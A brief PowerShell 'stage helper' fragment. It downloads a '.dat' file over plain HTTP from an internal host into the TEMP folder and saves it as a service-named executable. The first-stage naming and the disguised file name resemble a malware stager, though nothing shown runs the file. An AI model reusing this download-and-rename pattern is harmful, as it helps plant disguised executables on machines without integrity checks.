
# Stage helper
$Stage1Url = 'http://internal.corp/update.dat'
$OutputPath = "$env:TEMP\svcupdate.exe"
Start-BitsTransfer -Source $Stage1Url -Destination $OutputPath
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
